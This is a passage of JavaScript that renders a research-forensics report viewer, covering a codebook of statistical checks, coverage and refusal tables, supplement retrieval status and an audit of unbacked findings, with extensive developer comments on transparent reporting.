   `impossible`, what kind of claim is that, and what had to be true for the
   check to be entitled to say it? Without the assumptions, `impossible` reads
   as a fact about the paper; with them it reads as a conditional, which is
   what it actually is.

   ONE ENTRY PER TOOL, NOT PER CALL. A run makes several times more calls than
   it uses distinct tools, so per-call repetition would bury the findings in
   boilerplate.

   Collapsed by default and opened by the chip that links here. The reader who
   wants the class has it inline on the finding; the reader who wants the
   preconditions clicks once; the reader who wants the exact input contract
   opens the nested block. Depth by disclosure, not by density. */
function checkCardsHtml(){
  const T=D.tool_cards||{}, cards=T.cards||[], unk=T.undescribed||[];
  if(!cards.length && !unk.length) return '';
  const param=p=>`<tr><td><code>${esc(p.name)}</code></td><td>${esc(p.type)}</td>`+
    `<td>${esc(String(p.role||'').replace(/_/g,' '))}</td>`+
    `<td>${esc(p.help||'')||'<span class="muted">-</span>'}</td></tr>`;
  const one=c=>`<details class="card" id="cb-tool-${esc(c.tool)}">
    <summary><code>${esc(c.tool)}</code>
      <span class="ev">&mdash; ${esc(EV_CHIP[c.evidence]||c.evidence||'unclassified')}${
        c.severity_ceiling?'; strongest verdict it may reach: ':''}</span>${
        c.severity_ceiling?sev(c.severity_ceiling):''}</summary>
    ${c.purpose?`<p>${esc(c.purpose)}</p>`:''}
    ${c.evidence_meaning?`<p class="muted">${esc(c.evidence_meaning)}</p>`:''}
    ${(c.assumptions||[]).length?`<p><b>It assumes:</b></p><ul>${
      (c.assumptions||[]).map(a=>`<li>${esc(a)}</li>`).join('')}</ul>`:
      `<p class="muted">No assumptions are declared for this check. That is a gap
        in OUR documentation, not a statement that it has none.</p>`}
    ${(c.minimum_inputs||[]).length?`<details><summary class="muted">Minimum inputs
        (${c.n_minimum_inputs}), and what else it accepts</summary>
      <div class="scroll"><table class="cardparams"><thead><tr><th>input</th><th>type</th>
        <th>role</th><th>what it is for</th></tr></thead><tbody>${
        (c.minimum_inputs||[]).map(param).join('')}${
        (c.optional_inputs||[]).map(param).join('')}</tbody></table></div>
      ${(c.guards||[]).length?`<p class="muted"><b>Preconditions it will not
        degrade past:</b> ${(c.guards||[]).map(g=>`<code>${esc(g)}</code>`).join(', ')}.
        Supplied the wrong one, a check does not get vaguer -- it inverts.</p>`:''}
      </details>`:''}
  </details>`;
  return `<h3 id="cb-checks">What each check can conclude</h3>
    <p class="muted">One entry per check this review names. The evidence class
      says what KIND of claim its verdict is; the assumptions are the conditions
      under which that verdict holds. Where one is unmet the verdict is capped,
      not merely caveated. Being listed here does not mean the check ran on this
      paper -- see <a href="#coverage">Coverage and limits</a> for what did.</p>
    ${cards.map(one).join('')}
    ${unk.length?`<p class="muted">${unk.length} check(s) this run names that this
      glossary cannot describe: ${unk.map(u=>`<code>${esc(u)}</code>`).join(', ')}.
      Named rather than dropped: a check we cannot describe is a hole in this
      section, and omitting it would make the section look complete.</p>`:''}`;
}

/* Folded into "How to read this" rather than standing as its own tab: both are
   documentation of the same document, and splitting them meant a reader
   looking up a term had to guess which of two pages defined it. */
function codebookHtml(){
  const row=(a,b)=>[`<code>${esc(a)}</code>`, b];
  return `<h2 id="codebook">Codebook</h2>
  <p class="muted">Every coded term used anywhere in this bundle.</p>
  <h3 id="cb-verdict">Verdict</h3>
  <p class="muted">The one-word summary on the Overview. It grades what this
    review could and could not reconcile -- not the worth of the paper, and
    not the conduct of its authors.</p>
  ${tbl(['term','meaning'],[
    row('reconciles','The numbers this analysis could check reconcile with each other and with the statistics printed beside them. No finding survived triage as a DETERMINATION (impossible or highly suspicious), no claim was lost to a multiplicity correction, and the main claim was checkable. Open questions may remain and are listed: `suspicious` is a question, not a determination, and does not disqualify this verdict.'),
    row('unresolved','The middle verdict, and the only one with no direction: something could not be settled -- an anomaly that does not resolve either way, an extraction we could not confirm, or a check that could not run on the claim that matters. It is NOT a finding of misconduct: an unanswered question and an accusation are different things, and this word marks the first.'),
    row('does_not_reconcile','The paper\'s own numbers contradict one another AND the contradiction reaches a result the paper depends on. Severity alone never suffices: impossible arithmetic in a table no conclusion rests on stays `unresolved`. A statement about the arithmetic as printed -- NOT a finding of misconduct, and the commonest cause is a reporting or transcription error.'),
  ],{filterFrom:99})}
  <h3 id="cb-severity">Severity</h3>
  ${/* Rendered from SEV_DEF -- the map every severity word's hover title
        reads -- so the codebook and the point-of-use definitions cannot
        drift apart. */''}
  ${tbl(['term','meaning'],SEVERITY_ORDER.map(s=>row(s,SEV_DEF[s]||'')),{filterFrom:99})}
  <h3>Check used ("technique")</h3>
  <p class="muted">Which forensic procedure produced the finding.</p>
  ${tbl(['term','meaning'],[
    row('grim','GRIM: a mean of integer responses must be a multiple of 1/n.'),
    row('grimmer','GRIMMER: the SD is constrained once the mean and n are fixed.'),
    row('sprite','SPRITE: attempts to reconstruct a sample matching the mean, SD, n and bounds.'),
    row('debit','DEBIT: for a 0/1 variable the SD is determined by the mean.'),
    row('statcheck','Recomputes a p-value from its own test statistic and df.'),
    row('reconcile','Checks printed numbers against each other -- an estimate against its own CI, a p against its interval.'),
    row('check_summation','Checks that parts sum to the stated total.'),
    row('duplication','Looks for repeated blocks of statistics that are unlikely to recur by chance.'),
    row('stalt','Examines a p-value reported only as a threshold (p<.05).'),
    row('flag_round_n','Heuristic: implausibly round sample sizes.'),
    row('manual','Read off the paper by the model, NOT computed by a validated tool. Weakest evidence class here.'),
  ])}
  ${checkCardsHtml()}
  <h3>Variable typing</h3>
  ${tbl(['term','meaning'],[
    row('nominal','Unordered categories. Differences and means are undefined.'),
    row('ordinal','Ordered categories with no guaranteed equal spacing.'),
    row('interval','Equal spacing, arbitrary zero.'),
    row('ratio','Equal spacing with a true zero, so ratios are meaningful.'),
    row('discrete / continuous','Whether the variable takes isolated values or any value in a range. Granularity checks need discrete.'),
    row('admits','Which checks this typing PERMITS -- not which ran.'),
    row('derivation','How the variable was computed, if it was. It changes the granularity: a mean of k items moves in steps of 1/(k*n), not 1/n.'),
    row('confidence','How sure this analysis is of the typing itself, not of the paper.'),
  ])}
  <h3>Provenance and audit</h3>
  ${tbl(['term','meaning'],[
    row('rests_on','Whether a finding rests on a constraint the paper STATES, on logic alone, or on a bound we assumed. Assumed bounds are the weakest.'),
    row('warrant','WHOSE STANDARD a criticism invokes -- a different question from who computed it. paper_commitment: the paper promised this itself (a guideline it claims, its registration, its stated outcomes), so it is being held to its own word. named_guideline: an external standard and a specific item within it. logical: the paper contradicts itself or the arithmetic does not work, and nothing outside the document is needed. field_norm: a standard the REVIEWER supplied that this paper never claimed to follow -- it may well be the right standard, but it is ours, it is labelled as ours on the finding, and it caps the finding at "suspicious", because a standard a paper never accepted cannot support a determination about it. A finding that names no warrant is read as field_norm and capped the same way.'),
    row('bound_source','stated = the paper gives the scale; assumed = we supplied it, which caps how severe a finding may be.'),
    row('validated','Whether the call went through a validated forensic tool rather than a general-purpose one.'),
    row('unvalidated surface','A built-in tool (file reading). Not a forensic result.'),
    row('provenance','printed_table / printed_text / measured. Measured values come off a figure and cannot support exact-arithmetic checks.'),
    row('n_per_group','Sample size per arm. A total alone hides imbalance.'),
    row('Read from','The passage of the paper a check says its numbers came from, shown on each call in Chain of reasoning. The verdict beside it is decided here, not by the model: the quote is searched for in the paper afterwards. "found in the paper" means the words are there; "NOT found as a passage" and "NOT located" mean our search failed, which is usually a limit of the extraction rather than anything about the authors.'),
  ])}`;
}

S.push({id:'coverage', label:'Coverage and limits', build(){
  const u=D.unchecked||[], c=D.coverage||{};
  const rep=D.report_obj||{}, cs=rep.coverage_summary||D.coverage_summary||{}, nc=rep.not_checked||[];
  const ck=cs.checkable||{};
  /* THE COMPLETENESS MANIFEST. Written into `coverage_summary` by agent.py and
     read by NOTHING until 2026-08-12 -- and it escaped VIEWER_MUST_RENDER as
     well, the contract that exists to catch precisely this. The module built to
     prove every checkable item ends the run with a label was itself an item
     that ended the run without one. */
  const cm=cs.completeness||{};
  const compRows=cm.n_items?[
    ['items registered',esc(cm.n_items)],
    ['refused, with a stated reason',esc(cm.n_refused)],
    ['outstanding (neither checked nor refused)',esc(cm.n_outstanding)],
    ['from supplementary material',esc(cm.n_supplement_items==null?'not counted':cm.n_supplement_items)],
    ['checked',cm.n_checked_measurable===false
      ?`<span class="muted">not measured -- ${esc(cm.n_checked_unmeasured_because||'')}</span>`
      :esc(cm.n_checked)]]:[];
  /* FILES THIS REVIEW COULD NOT LOAD. A supplement whose 1,114,127 characters
     would not fit through a tool result is ABSENT from the review, and on this
     page it used to look exactly like a supplement with nothing in it. The fact
     was detected from 2026-08-15 and filed under `run_meta`, which no report
     reads and which names no file -- so the only archived run that lost one
     outright disclosed it because the MODEL chose to write it into
     `not_checked` in prose. This is the same fact as a record.

     `unread` and `partial` are kept apart on purpose: measured over the archive,
     16 of 17 affected files came back by another route (a paged retry, a
     per-table fetch, or reading the harness's spill file), and reporting those
     as lost would cry wolf about our own side. */
  const ud=cs.undelivered||{};
  const udFiles=ud.files||[];
  const undelivered=ud.error
    ?`<h4>Files this review could not load</h4>
      <p class="muted">Not measured: ${esc(ud.error)}</p>`
    :(udFiles.length?`<h4>Files this review could not load (${udFiles.length})</h4>
      <div class="note bad">${esc(ud.note||'')}</div>
      ${tbl(['file','what happened','what that means'],udFiles.map(f=>[
        `<code>${esc(f.file||'?')}</code>`,
        f.status==='unread'
          ?`<strong class="bad">never loaded</strong>`
          :`<span class="muted">read in pieces</span>`,
        esc(f.note||'')]))}
      <p class="muted">A file we could not load is OUR gap. Nothing here is
        evidence that the file is empty, that its tables do not exist, or that
        the paper failed to report something -- and any check that would have
        run on it did not run.</p>`:'');
  /* STAGE-1 RECONCILIATION. Every finding the sweep raised must end stage 2
     with a disposition, for the same reason every checkable item must: the
     alternative is silence, and silence reads as a clean pass. `clean` here
     means no accusation was dropped WITHOUT a stated reason -- dropping one is
     legitimate editorial work, doing it silently is what a reader cannot
     audit. */
  const sr=cs.stage1_reconciliation||{};
  const srRows=sr.n_stage1?[
    ['stage-1 findings raised',esc(sr.n_stage1)],
    ['carried into this report',esc(sr.n_carried)],
    ['not carried',esc(sr.n_dropped)],
    ['accusations dropped with NO stated reason',
      (sr.n_accusatory_unexplained||0)>0
        ?`<strong class="bad">${esc(sr.n_accusatory_unexplained)}</strong>`
        :esc(sr.n_accusatory_unexplained||0)]]:[];
  const srList=(sr.accusatory_unexplained||[]).slice(0,8).map(r=>
    `<li><code>${esc(r.severity)}</code> &mdash; ${esc(r.location||r.id||'')}</li>`).join('');
  /* THE SECOND LOOK. Computed by code, handed to stage 2, and -- until
     2026-08-13 -- shown to nobody. That is this repository's signature defect
     landing on a field added the same day: produced, consumed by the model,
     invisible to the reader.

     Greg's standing requirement is to "see all output at every level, for the
     purposes of testing and scrutiny", and this is the level where our own
     accusations were graded. It is shown as a WORKLIST, never a verdict: a
     flagged finding is not thereby wrong, and stage 2's answer to it lives in
     `triage`. */
  const sl=(rep.second_look||D.second_look||{});
  const slItems=(sl.items||[]).slice(0,8);
  const secondLook=(typeof sl.n_accusatory==='number')?`<h4>Accusations this
      review flagged against itself</h4>
    <p class="muted">Before the editorial stage triaged anything, code checked
      every accusation for three weaknesses it can decide without judgement: a
      number no registered tool produced, a quote we could not find in the
      paper, and a severity resting on a scale bound the paper never stated.
      <b>Nothing here is wrong because it is listed</b> -- this is what the
      review was told to look at twice, and what it concluded is in its
      triage.</p>
    ${kv([['accusations made', esc(sl.n_accusatory)],
          ['carrying a named weakness in their evidence',
           (sl.n_flagged||0)>0?`<strong>${esc(sl.n_flagged)}</strong>`:esc(0)]]
         .concat(Object.entries(sl.by_marker||{}).map(([k,v])=>
           ['&nbsp;&nbsp;'+esc(k.replace(/_/g,' ')), esc(v)])))}
    ${slItems.length?`<details><summary>Which ones</summary>
      ${tbl(['finding','severity','where','weakness'],slItems.map(r=>[
        esc(r.id||''), esc(r.severity||''), esc(r.location||''),
        esc((r.markers||[]).join(', '))]))}</details>`:''}
    ${sl.note?`<p class="muted">${esc(sl.note)}</p>`:''}`:'';

  const recon=sr.reconcilable===false
    ?`<h4>Stage-1 reconciliation</h4><p class="muted">${esc(sr.note||'Not possible for this run.')}</p>`
    :(sr.n_stage1?`<h4>Stage-1 reconciliation</h4>
      <p class="muted">A finding the sweep raised and this report never mentions is a
        claim the review made and then withdrew. Dropping a <code>consistent</code>
        result needs no explanation; dropping an accusation does.</p>
      ${kv(srRows)}
      ${srList?`<p class="muted">Dropped accusations with no recorded reason:</p><ul>${srList}</ul>`:''}`:'');
  const comp=cm.n_items?`<h4>Every checkable item, and whether it ended the run with a label</h4>
    <p class="muted">The census above counts table cells. This counts every
      checkable item the paper contains, prose included, and asks a harder
      question of each: did it end the run either checked, or refused for a
      reason from a closed vocabulary? An item that is neither is invisible in
      the findings, and a reader cannot tell it from a clean pass.</p>
    ${kv(compRows)}
    ${cm.note?`<p class="muted">${esc(cm.note)}</p>`:''}`:'';
  /* WHERE EVERY NUMBER CAME FROM. Greg, 2026-08-13: "It should be impossible
     for an agent to perform computations and it not be recorded for the sake of
     the output. That's black box nonsense I want to avoid."

     It is a LEDGER, not an accusation list, and the distinction is the whole
     design. Every figure a finding presents is searched for in the paper's own
     text: one that is there was COPIED, and needs only a locator; one that is
     not was produced by the agent, and is named here so a reader can check the
     derivation instead of taking it on trust. MEASURED 2026-08-13 across the
     archive, 86.7% of the 369 figures in non-tool findings are in their paper
     verbatim -- so the common case is a bookkeeping gap, and presenting it as
     anything worse would be the false-accusation failure turned on ourselves. */
  const ca=cs.computation_audit||{};
  const caKind=ca.by_kind||{};
  const caDerived=(ca.unauditable||[]).concat(ca.ledger||[])
    .filter(r=>(r.codes||[]).indexOf('number_derived')>=0);
  const caRows=ca.n_findings?[
    ['findings whose numbers a registered tool produced',esc(caKind.tool||0)],
    ['findings resting on no arithmetic at all',esc(caKind.not_computational||0)],
    ['figures the agent produced itself',
      (ca.n_derived||0)>0?`<strong>${esc(ca.n_derived)}</strong>`:esc(0)],
    ['figures found in the paper verbatim (a quotation, not a computation)',
      esc(ca.n_transcribed||0)],
    /* NOT "provenance not recoverable". On the first real bundle this rendered
       on, that row read 12 beside a "found in the paper verbatim: 12" row --
       the SAME twelve findings, whose figures were all recovered. What was
       unrecoverable was whether arithmetic was involved at all, and that is our
       vocabulary gap. Naming it as a provenance failure would have converted
       our bookkeeping into an apparent defect of the review. */
    ['records this audit could not classify',
      (ca.n_unauditable||0)>0?`<strong>${esc(ca.n_unauditable)}</strong>`
        +` <span class="muted">-- broken out below; most of these are ours</span>`
        :esc(0)]]:[];
  const caCodes=Object.entries(ca.by_code||{}).map(([k,v])=>
    [`<code>${esc(k)}</code>`,esc(v),esc((ca.code_meanings||{})[k]||'')]);
  const compAudit=ca.n_findings?`<h4>Where every number in this review came from</h4>
    <p class="muted">A figure this review prints was either copied out of the
      paper or worked out by the agent, and a reader is entitled to know which.
      Each one is searched for in the paper's own text -- article and
      supplements. Nothing is withheld for failing this: an unrecorded number is
      not an invented one, and the pattern of what needed accounting for is
      itself worth reading.</p>
    ${ca.paper_readable===false?`<div class="note"><b>The paper could not be read
      on this run</b>, so no figure below could be checked against it. That is
      OUR gap, not a statement about any finding.</div>`:''}
    ${/* A PARTIAL SOURCE INFLATES "the agent produced it". If the prose failed
          to extract and only table cells were available, a figure quoted from a
          sentence is not found and lands in the agent's column -- our failure
          wearing the review's clothes. The caveat travels with the count. */''}
    ${ca.haystack_problem?`<div class="note"><b>Only part of the paper was
      available to check figures against:</b> ${esc(ca.haystack_problem)}</div>`:''}
    ${kv(caRows)}
    ${caCodes.length?`<p class="muted">Every remark this audit made, and what
      each one means. A count with no definition beside it is a number a reader
      has to guess at.</p>
      ${tbl(['remark','findings','what it means'],caCodes)}`:''}
    ${caDerived.length?`<details><summary>The ${caDerived.length} finding(s)
      presenting a figure that is not in the paper</summary>
      <p class="muted">These are the agent's own arithmetic. None is wrong for
        being listed -- the list exists so the derivation can be checked rather
        than assumed.</p>
      ${tbl(['finding','severity','what the audit found'],caDerived.map(r=>[
        esc(r.id||''),esc(r.severity||''),esc((r.problems||[]).join(' '))]))}
    </details>`:''}
    ${ca.note?`<p class="muted">${esc(ca.note)}</p>`:''}`:'';

  /* "Checked" was a raw JSON dump sitting beside a properly rendered "NOT
     checked" table -- the same information in two registers, and the dumped
     half was the one a reader is more likely to want. */
  const haveDenom=typeof cs.stats_checked==='number'&&typeof cs.stats_found==='number';
  const rows=Object.entries(c)
    /* `stats_found` is the numerator's partner and is printed with it above.
       Left in, it appeared twice on one page, once alone -- which is the
       presentation this section exists to stop. */
    .filter(([k])=>!(haveDenom&&k==='stats_found'))
    .map(([k,v])=>[esc(k.replace(/_/g,' ')),
      Array.isArray(v)?v.map(x=>`<code>${esc(x)}</code>`).join(' '):esc(v)]);

  /* THE DENOMINATOR. `findings.coverage` carries `stats_found` and the viewer
     printed it; `report.coverage_summary` carries `stats_checked` beside it
     and the viewer read that object nowhere at all. So a run that located 741
     statistics and checked 122 of them advertised the 741 on its coverage page
     -- the most inflating number available, presented as the coverage figure.
     Neither number means anything without the other. */
  /* NO PERCENTAGE FROM THESE TWO NUMBERS. EVER.
     `stats_found` and `stats_checked` are both MODEL-ASSERTED -- one written by
     stage 1, the other by stage 2, into schema fields that carry no definition
     of what a "statistic" is. The viewer divided them and rendered "16%" as
     though it were a measurement.

     MEASURED on 10.1038/s41537-025-00576-3: `stats_found` was 741, and by the
     model's own working that is dominated by TABLE CELLS -- one of its
     component terms is literally written "~300". `stats_checked` was 122 and
     approximates check OPERATIONS; the tool ledger holds 116 atomic checks, 56
     of them summation checks each spanning many cells. Different units, both
     guessed, one ratio.

     And the denominator is larger than the checkable surface: `cell_census` on
     that paper's own XML returns 920 cells, 497 consumable, 145 runnable as
     reported -- 352 blocked because the paper never prints an n. A denominator
     of 741 guarantees a low-looking rate however well the run goes. Against
     the runnable surface the same run checked ~30%, not 16%.

     So the two numbers are still SHOWN -- they are the review's own account of
     itself and suppressing them would be its own dishonesty -- but they are
     labelled as unaudited and they are never divided. The measured figure is
     the census below. */
  const denom=haveDenom
    ? `<h4>The review's own account</h4>
       <p class="muted">Both numbers below were written by the model, into
         schema fields that do not define what counts as one "statistic". They
         are its report of its own work, not a measurement of it, and they are
         deliberately not divided into each other: the two stages count
         different things -- one leans on table cells, the other on check
         operations -- so a ratio of them would be a percentage of nothing. The
         audited figure is the cell census.</p>
       ${kv([['statistics the review says it located', String(cs.stats_found)],
             ['statistics the review says it checked', String(cs.stats_checked)]])}`
    : '';

  /* THE CELL CENSUS. Computed on every run by the commit that argued coverage
     must be measured against what was CHECKABLE rather than against what
     happened to be checked -- and then rendered nowhere a reader goes. Its own
     `note` is the plainest sentence in the payload, so it is printed verbatim
     rather than paraphrased. */
  /* THE AUDITED DENOMINATOR, and the taxonomy it makes possible.
     A shortfall presented as one lump reads as a task list abandoned. It is
     four different things, and only the last is ours:

       not checkable by anyone   the cell is not a quantity a check consumes
       the paper withholds it    an input the check needs is never printed
       undeclared                nobody said what kind of quantity the row is
       checked                   what we actually did

     `blocked_on_input` in particular is a fact about the PUBLICATION -- on
     10.1038/s41537-025-00576-3 it is 352 of 497 consumable cells, every one
     because the paper prints no n. Filing that under our shortfall converts a
     property of the paper into an apparent failure of ours. */
  const census=(typeof ck.n_cells==='number')?`<h4>Table cells: the audited count</h4>
    ${/* AN UNEXAMINED CENSUS IS NOT A CENSUS OF ZERO. `census.summarise` sets
          no_cells_examined when it was handed nothing at all, in which case
          every count below is 0 because there was nothing to count -- not
          because the paper was found to hold nothing. Rendered as a warning
          ABOVE the table, because the numbers underneath are the part a reader
          takes away and they read identically either way. */''}
    ${ck.no_cells_examined?`<div class="note"><b>No table cells were examined.</b>
      Every figure below is 0 because there was nothing to count, not because
      this paper's tables were found to hold nothing. Whether it has checkable
      cells is UNKNOWN from this census.</div>`:''}
    ${ck.note?`<p>${esc(ck.note)}</p>`:''}
    ${kv([
      ['cells extracted from the tables', String(ck.n_cells??'-')],
      ['of those, a check could consume', `<b>${esc(String(ck.n_consumable??'-'))}</b>`+
        ` <span class="muted">-- the rest are labels, notes and text: not a
          shortfall, just not quantities</span>`],
      ['of those, runnable exactly as the paper reports them',
        String(ck.n_runnable??'-')+
        ((Number(ck.cells_checked_via_check_table||0) > Number(ck.n_runnable||0))
          ? ` <span class="muted">-- fewer than the <i>checked</i> row below,
              which is not a contradiction: this counts cells needing NOTHING
              added, while a cell becomes checkable once its row is declared or
              its n supplied. ${esc(String(ck.n_runnable??0))} needed nothing;
              ${esc(String(ck.cells_checked_via_check_table??0))} were checked
              in the end.</span>`
          : '')],
      /* MEASURED BY BROWSING, 2026-08-13: the page showed "runnable exactly as
         the paper reports them: 0" immediately above "checked: 21", and a
         reader who asks how 21 cells were checked when 0 were runnable has no
         way to answer it from the page. Both numbers are correct and they
         count different things. tests/test_output_is_read.py already recorded
         this incoherence as the reason never_submitted is not rendered -- and
         did not notice that the two numbers it describes were both on screen,
         adjacent, unexplained. The clause appears only when the two actually
         diverge, so a run where they agree does not carry an explanation of a
         discrepancy it does not have.

         NOTE this is a plain JS block comment, NOT the dollar-brace comment
         form used elsewhere in this file. That form is an interpolation and is
         valid only inside a template literal; here it sits in an ARRAY LITERAL
         passed to kv(), where it is a syntax error that blanks the whole page.
         It did, for one build: Python rendered the file without complaint and
         three separate string assertions passed, because the broken text was
         present in the output either way. Only extracting the script and
         running node --check caught it -- which is the same lesson the defect
         this clause explains was found by. */
      ['checked', String(ck.cells_checked_via_check_table??0)+
        ` <span class="muted">-- counts only cells routed through
          <code>check_table</code>. A review that called a check directly on
          each cell scores 0 here, so this UNDERSTATES what was done rather
          than flattering it.</span>`],
      ['THE PAPER does not print an input the check needs',
        String(ck.blocked_on_input??0)+((ck.missing_inputs&&Object.keys(ck.missing_inputs).length)
          ? ` <span class="muted">-- ${esc(Object.entries(ck.missing_inputs)
              .map(([k,v])=>k+': '+v).join(', '))}. A property of the
              publication, not of this review.</span>`:'')],
      ['no one declared what kind of quantity the row is',
        String(ck.blocked_on_declaration??0)+
        ` <span class="muted">-- the fixable one: a declaration would let these
          run</span>`],
    ])}`
    /* SILENCE READS AS A PASS. The census is computed on every run at current
       HEAD, but a bundle rebuilt from an OLDER run has none -- this one
       predates the census commit by nine hours -- and the page simply fell
       back to the model's numbers with nothing said. A reader had no way to
       know the audited figure was missing rather than merely unflattering. */
    : (D.census_is_a_legacy_capability
        ? `<div class="note"><b>No audited cell count for this run.</b> The
            census that measures how many table cells a check could actually
            consume is computed only on the legacy analysis path, and this
            review came through the current one, so there is no audited figure
            to show and re-running would not produce one. The figures above are
            the review's own account of what it found, not a measurement of
            what was there.</div>`
        : `<div class="note"><b>No audited cell count for this run.</b> The
            census that measures how many table cells a check could actually
            consume was added after this review ran, so the only figures
            available are the model's own, above. Treat them as the review's
            self-report. Re-running the paper at current HEAD produces the
            audited count.</div>`);

  /* TWO STAGES RECORD REFUSALS AND THEY RECORD DIFFERENT ONES. The viewer
     rendered `findings.unchecked` (the sweep's) and never `report.not_checked`
     (the editorial stage's), and measured across the archived runs the
     editorial list is consistently the LONGER of the two -- 9 against 8, 12
     against 10, 13 against 11. So the page showing "what we did not check" was
     showing the shorter list every time.

     They are NOT merged. The two lists paraphrase the same refusals in
     different words, so any dedupe short of fuzzy matching leaves near
     duplicates side by side, and fuzzy matching would silently drop a genuine
     entry to tidy the table. The editorial list leads because it is the later
     and fuller record; the sweep's sits under it, whole, one click down. */
  const refusals=nc.length
    ? `<h3>Checks that did not run, and whose limit it was (${nc.length})</h3>
       ${/* LEAD WITH THE SPLIT, not with the count. Greg, 2026-08-11: a reader
             must not "come away with the impression that there were more errors
             and omissions than there actually are". The count alone is exactly
             that impression. The sentence is computed in Python
             (`viewer_facts.refusal_tally`) so the page cannot drift from it. */''}
       ${(D.facts&&D.facts.refusals&&D.facts.refusals.reading)
         ? `<p class="lede">${esc(D.facts.refusals.reading)}</p>` : ''}
       ${/* THE WARNING WAS COMPUTED AND NEVER RENDERED, on 3 of 5 real bundles.
             `viewer_facts.refusal_tally` says in so many words that "the
             warning is the part that matters" -- a breakdown in which most rows
             are unclassified looks like an answer and is not one -- and the
             page printed the tidy tally instead and dropped the caveat. The
             tally is only worth reading when the classifier placed most of it,
             so the caveat goes ABOVE the counts, not below them. */''}
       ${(D.facts&&D.facts.refusals&&D.facts.refusals.warning)
         ? `<p class="note">${esc(D.facts.refusals.warning)}</p>` : ''}
       <p class="muted">A check that did not run is not a negative result, and
         these are not all the same KIND of thing. Read as one list they suggest
         a task list abandoned; sorted, most of them are not shortfalls of this
         review at all. Each row says whose limit it was.</p>
       ${refusalTally(nc)}
       ${tbl(['location','whose limit','reason'],nc.map(x=>{
         const c=classifyRefusal(x.reason);
         return [esc(x.location), `<span class="whose ${c.key}">${c.label}</span>`,
                 esc(x.reason)];
       }))}
       ${u.length?`<details><summary>The sweep recorded its own ${u.length}
         refusal(s), in its own words</summary>
         <p class="muted">Recorded at the earlier stage. The two lists overlap and
           are not merged: they paraphrase the same refusals differently, and
           matching them up by hand risks dropping one that is genuinely new.</p>
         ${tbl(['location','reason'],u.map(x=>[esc(x.location),esc(x.reason)]))}
       </details>`:''}`
    : `<h3>What this review could not check (${u.length})</h3>
       <p class="muted">A refusal is not a negative result. Everything here was
         left unexamined, for the reason given.</p>
       ${tbl(['location','reason'],u.map(x=>[esc(x.location),esc(x.reason)]))}`;

  const lims=rep.limitations||[];
  const r=D.supplement_retrieval||{};
  return `<h2>Coverage and limits</h2>
    ${/* FIRST on this page, above every coverage figure, because those figures
          count only what arrived: a denominator quoted before the reader knows
          a supplement never loaded is a denominator that misleads. */''}
    ${undelivered}
    <h3>How much of the paper was checked</h3>
    ${denom||'<p class="muted">This run recorded no checked-against-found count.</p>'}
    ${census}
    ${comp}
    ${recon}
    ${secondLook}
    ${compAudit}
    <h4>What ran</h4>
    ${kv(rows)}
    ${refusals}
    ${lims.length?`<h3>Limitations the review recorded about itself (${lims.length})</h3>
      <p class="muted">Written by the review, about the review. These are the
        conditions under which everything on the Findings page should be read.</p>
      <ul>${lims.map(x=>`<li>${esc(x)}</li>`).join('')}</ul>`:''}
    ${r.sentence?`<h3>Supplementary material</h3>
      ${/* "Not supplied to this review" wore the same words whether no
            provider publishes one or our own download 404'd. Over the paper
            directories in this repo the second is the commoner case, and it is
            our failure being reported as the publication's gap. */''}
      <p>${esc(r.sentence)}</p>
      ${/* A DE-DUPLICATION IS NOT A DOWNLOAD FAILURE. Every skip went into one
            table headed "why it failed", so the fetcher asking several
            providers for the same paper -- and correctly keeping one copy --
            read as six errors. MEASURED across the archived retrieval records:
            43 skips, 32 of them `duplicate-of`. On this paper the page showed
            six failures and the true number was zero. */''}
      ${((r.failures||[]).length||(r.duplicates||[]).length
         ||(r.not_open_access||[]).length||(r.speculative_addresses||[]).length)?`<details>
        <summary>What we tried (${r.providers_queried||0} providers queried)</summary>
        ${(r.failures||[]).length?`<h4>Could not be obtained (${r.failures.length})</h4>
          ${tbl(['provider','file','what happened'],(r.failures||[]).map(f=>[
            esc(f.provider),esc(f.name),
            (f.explanation?esc(f.explanation)+' ':'')
            +'<code>'+esc(f.reason)+'</code>'+(f.http?' (HTTP '+esc(f.http)+')':'')]))}`
          :'<p class="muted">Nothing we asked for failed to arrive.</p>'}
        ${/* A LICENCE WALL AND A CONSTRUCTED ADDRESS both used to sit in the
              table above, under "what happened", which reads as our transfer
              breaking. Neither is. MEASURED on a fresh 15-paper fetch: 7
              `no-bundle` skips, 3 of them the provider saying the article is
              not open access and 4 a bare 404 at a URL the fetcher builds from
              the PMCID before knowing a bundle exists. */''}
        ${(r.not_open_access||[]).length?`<h4>Exists, but not ours to download
          (${r.not_open_access.length})</h4>
          <p class="muted">The provider holds this supplement and will not serve
            it: the article is not open access. It is not missing and our fetch
            did not fail -- it is behind a licence. A library or the publisher's
            own site is the route to it.</p>
          ${tbl(['provider','file','the provider said'],(r.not_open_access||[]).map(f=>[
            esc(f.provider),esc(f.name),esc(f.detail||'not open access')]))}`:''}
        ${(r.speculative_addresses||[]).length?`<h4>Asked at a guessed address
          (${r.speculative_addresses.length})</h4>
          <p class="muted">Europe PMC answers a bundle URL built from the PMCID
            alone, so the fetcher asks for one whether or not it exists. Nothing
            came back. That is an absence, not a file somebody published that we
            then failed to collect.</p>
          ${tbl(['provider','file'],(r.speculative_addresses||[]).map(f=>[
            esc(f.provider),esc(f.name)]))}`:''}
        ${(r.duplicates||[]).length?`<h4>Skipped as already held
          (${r.duplicates.length})</h4>
          <p class="muted">The fetcher asks several providers for the same
            paper, so the same file arrives more than once. These are the copies
            after the first. They are the retrieval working, not failing.</p>
          ${tbl(['provider','file'],(r.duplicates||[]).map(f=>[
            esc(f.provider),esc(f.name)]))}`:''}
      </details>`:''}`:''}`;
}});

S.push({id:'audit', label:'Audit', build(){
  const g=D.guard_audit||{}, s=D.sandbox_audit||{};
  const nUn=s.n_unvalidated_total, nSev=s.n_severe_total;
  let verdict, detail;
  if(nUn===undefined){
    verdict='NOT RECORDED';
    detail='This run has no sandbox audit, so whether anything ran outside the '+
      'validated surface is unknown. Treat findings accordingly.';
  } else if(nUn===0 && (s.n_unbacked_findings||0) > 0){
    /* SAME DEFECT AS THE TABLE BELOW, one line up. The written verdict on disk
       already said "BREACH (unbacked)" and the page printed CLEAN above it,
       because this branch read only the tool-surface counters. On the wave-3
       eat.24415 bundle that is exactly what a reader saw: CLEAN, and directly
       under it "Recorded verdict: BREACH (unbacked): 1 finding(s) name a check
       that never ran". The unbacked case is the likelier failure -- the
       arithmetic was asserted rather than performed -- and it is invisible to
       a tool-surface check, so it cannot be folded into CLEAN. */
    verdict='UNBACKED FINDING';
    detail=s.n_unbacked_findings+' finding(s) name a check that never ran: no '+
